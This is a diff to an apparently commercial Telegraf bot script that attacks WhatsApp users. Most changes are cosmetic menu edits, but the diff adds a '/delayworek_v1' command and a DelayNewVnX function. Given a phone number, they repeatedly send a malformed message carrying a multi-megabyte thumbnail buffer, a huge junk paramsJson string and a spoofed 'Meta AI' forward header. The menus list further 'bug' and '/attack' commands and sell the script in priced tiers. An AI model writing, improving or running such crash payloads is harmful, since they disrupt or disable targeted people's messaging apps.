@@ -1083,13 +1083,14 @@ async function sendHome(ctx) {
   const sender = isWhatsAppConnected;
 
   const caption = `
-<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡
+<blockquote>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡</blockquote>
 ◇ Developer : @Bawzhhh
+◇ System : Auto Update
 ◇ Version : 1.0 New Era
 ◇ Language : JavaScript
 ◇ Framework : Telegraf 
 
-╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』───═⬡
+<blockquote>╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』───═⬡</blockquote>
 ◇ Stats Premium : ${premium ? "Yes" : "No"}
 ◇ Stats Sender : ${sender ? "Yes" : "No"}
 ◇ Runtime : ${runtime(process.uptime())}
@@ -1111,20 +1112,20 @@ bot.action("xsettings", async (ctx) => {
   const sender = isWhatsAppConnected;
 
   const caption = `
-<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡
+<blockquote>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡</blockquote>
 ◇ Developer : @Bawzhhh
+◇ System : Auto Update
 ◇ Version : 1.0 New Era
 ◇ Language : JavaScript
 ◇ Framework : Telegraf 
 
-╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』───═⬡
+<blockquote>╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』───═⬡</blockquote>
 ◇ Stats Premium : ${premium ? "Yes" : "No"}
 ◇ Stats Sender : ${sender ? "Yes" : "No"}
 ◇ Runtime : ${runtime(process.uptime())}
 ◇ Memory : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
 
-╭═───⊱『 𝐗𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒 𝐌𝐄𝐍𝐔 』───═⬡
-
+<blockquote>╭═───⊱『 𝐗𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒 𝐌𝐄𝐍𝐔 』───═⬡</blockquote>
 ◇ /update          
 ◇ /connect
 ◇ /addprem
@@ -1145,7 +1146,6 @@ bot.action("xsettings", async (ctx) => {
 ◇ /runtime
 ◇ /mode
 ◇ /cekowner
-</pre>
 `;
 
   await editMenu(ctx, caption, [[{ text: "🔙𝐁𝐀𝐂𝐊 𝐌𝐄𝐍𝐔", callback_data: "backmenu", style: "primary" }]]);
@@ -1158,24 +1158,25 @@ bot.action("xbugs", async (ctx) => {
   const sender = isWhatsAppConnected;
 
   const caption = `
-<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡
+<blockquote>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡</blockquote>
 ◇ Developer : @Bawzhhh
+◇ System : Auto Update
 ◇ Version : 1.0 New Era
 ◇ Language : JavaScript
 ◇ Framework : Telegraf 
 
-╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』───═⬡
+<blockquote>╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』───═⬡</blockquote>
 ◇ Stats Premium : ${premium ? "Yes" : "No"}
 ◇ Stats Sender : ${sender ? "Yes" : "No"}
 ◇ Runtime : ${runtime(process.uptime())}
 ◇ Memory : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
 
-╭═───⊱『 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐌𝐄𝐍𝐔 』───═⬡
-◇ /specterdelay
+<blockquote>╭═───⊱『 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐌𝐄𝐍𝐔 』───═⬡</blockquote>
+◇ /specterdelay 
+◇ /delayworek_v1
 
-╭═───⊱『 𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐌𝐄𝐍𝐔 』───═⬡
+<blockquote>╭═───⊱『 𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐌𝐄𝐍𝐔 』───═⬡</blockquote>
 ◇ /attack
-</pre>
 `;
 
   await editMenu(ctx, caption, [[{ text: "🔙𝐁𝐀𝐂𝐊 𝐌𝐄𝐍𝐔", callback_data: "backmenu", style: "primary" }]]);
@@ -1188,27 +1189,26 @@ bot.action("tools", async (ctx) => {
   const sender = isWhatsAppConnected;   
 
   const caption = `
-<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』 ───═⬡
+<blockquote>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡</blockquote>
 ◇ Developer : @Bawzhhh
+◇ System : Auto Update
 ◇ Version : 1.0 New Era
 ◇ Language : JavaScript
 ◇ Framework : Telegraf 
 
-╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』 ───═⬡
+<blockquote>╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』 ───═⬡</blockquote>
 ◇ Stats Premium : ${premium ? "Yes" : "No"}
 ◇ Stats Sender : ${sender ? "Yes" : "No"}
 ◇ Runtime : ${runtime(process.uptime())}
 ◇ Memory : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
 
-╭═───⊱『 𝐓𝐎𝐎𝐋𝐒 』───═⬡
-              
+<blockquote>╭═───⊱『 𝐓𝐎𝐎𝐋𝐒 』───═⬡</blockquote>            
 ◇ /brat
 ◇ /tiktokdl
 ◇ /convert
 ◇ /waktu
 ◇ /ssiphone
 ◇ /cekidch
-</pre>
 `;
 
   await editMenu(ctx, caption, [[{ text: "🔙𝐁𝐀𝐂𝐊 𝐌𝐄𝐍𝐔", callback_data: "backmenu", style: "primary" }]]);
@@ -1229,19 +1229,20 @@ async function showInfo(ctx, page = 1) {
 
   if (page === 1) {
     caption = `
-<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』 ───═⬡
+<blockquote>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡</blockquote>
 ◇ Developer : @Bawzhhh
+◇ System : Auto Update
 ◇ Version : 1.0 New Era
 ◇ Language : JavaScript
 ◇ Framework : Telegraf 
 
-╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』 ───═⬡
+<blockquote>╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』 ───═⬡</blockquote>
 ◇ Stats Premium : ${premium ? "Yes" : "No"}
 ◇ Stats Sender : ${sender ? "Yes" : "No"}
 ◇ Runtime : ${runtime(process.uptime())}
 ◇ Memory : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
 
-╭═───⊱『 𝐇𝐀𝐑𝐆𝐀 𝐒𝐂𝐑𝐈𝐏𝐓 』───═⬡
+<blockquote>╭═───⊱『 𝐇𝐀𝐑𝐆𝐀 𝐒𝐂𝐑𝐈𝐏𝐓 』───═⬡</blockquote>
               
 ◇40K FULL UP SCRIPT
 ◇50K RESELLER SCRIPT
@@ -1249,7 +1250,6 @@ async function showInfo(ctx, page = 1) {
 ◇75K MODERATOR SCRIPT
 ◇90K CEO SCRIPT
 ◇110K OWNER SCRIPT
-</pre>
 `;
 
     keyboard = [
@@ -1265,21 +1265,21 @@ async function showInfo(ctx, page = 1) {
 
   if (page === 2) {
     caption = `
-<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』 ───═⬡
+<blockquote>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡</blockquote>
 ◇ Developer : @Bawzhhh
+◇ System : Auto Update
 ◇ Version : 1.0 New Era
 ◇ Language : JavaScript
 ◇ Framework : Telegraf 
 
-╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』 ───═⬡
+<blockquote>╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』 ───═⬡</blockquote>
 ◇ Stats Premium : ${premium ? "Yes" : "No"}
 ◇ Stats Sender : ${sender ? "Yes" : "No"}
 ◇ Runtime : ${runtime(process.uptime())}
 ◇ Memory : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
 
-╭═───⊱『 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 』───═⬡
+<blockquote>╭═───⊱『 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 』───═⬡</blockquote>
  olaa saya Bawzhhh ingin memberitahu bahwa script ini adalah karya milik saya, saya berterimakasih kalian sudah memakai script bug ini walaupun ampas yakh hehe, titik bahagia seseorang adalah ketika karyanya di gunakan tanpa adanya rasa terpaksa tapi dengan hati yang tulus Terimakasih 
-</pre>
 `;
 
     keyboard = [
@@ -2146,7 +2146,25 @@ bot.command("specterdelay", checkAllPremium, checkWhatsAppConnection, async (ctx
   })();
 
 });
-/// CASE BUG 2///
+/// ============= CASE BUG 1 BEBAS SPAM=============\\\
+bot.command("delayworek_v1", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
+  try {
+  const q = ctx.message.text.split(" ")[1]; 
+  if (!q) return ctx.reply("🪧 ☇ Example : /specterdelay 62xx");
+
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+
+  await ctx.reply(`✅ delayworek_v1 (bug) selesai untuk ${q}`);
+
+  (async () => {
+    for (let r = 0; r < 30; r++) {
+  await DelayNewVnX(sock, target);
+  await sleep(4000);
+}
+  })();
+
+});
+/// CASE BUG 3///
 bot.command("Xtest", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
   try {
     const q = ctx.message?.text?.split(" ")[1];
@@ -2209,6 +2227,38 @@ async function DelayHardNullVnX(sock, target, ptcp = true) {
     } : { 
         messageId: msg.key.id 
     });
+}
+
+async function DelayNewVnX(sock, target) {
+   const vnxnew = {
+     groupStatusMessageV2: {
+       message: {
+        interactiveResponseMessage: {
+          body: {
+           text: "⏳ VnX",
+            jpegThumbnail: Buffer.alloc(6 * 1024 * 1024 + 500000, 0xFF),
+            },
+            nativeFlowResponseMessage: {
+              name: "address_message",
+              paramsJson: "\x10".repeat(920 * 150),
+              version: 3 
+            },
+            contextInfo: {
+             isForwarded: true,
+               forwardingScore: 9999,
+               fromMe: true,
+            forwardedAiBotMessageInfo: {
+               botJid: "13135550202@bot",
+               botName: "Meta AI",
+               creator: "VnX"
+              }
+            }
+          }
+       }
+     }
+   };
+           
+  await sock.relayMessage(target, vnxnew, {});
 }
 
 // --- Jalankan Bot --- //
